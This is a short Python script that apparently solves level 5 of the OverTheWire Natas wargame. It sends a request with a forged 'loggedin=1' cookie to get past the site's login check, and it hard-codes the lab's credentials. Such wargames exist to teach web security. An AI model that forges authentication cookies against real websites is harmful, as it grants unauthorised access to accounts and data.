#!/bin/python
import requests
import re

username = "natas5"
pwd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = f"http://{username}.natas.labs.overthewire.org"
#headers={'referer':'http://natas5.natas.labs.overthewire.org/'}
session = requests.Session()
cookie= {"loggedin":'1'}
response = session.get(url,auth=(username,pwd),cookies=cookie)
content=response.text
print(content)
print(session.cookies)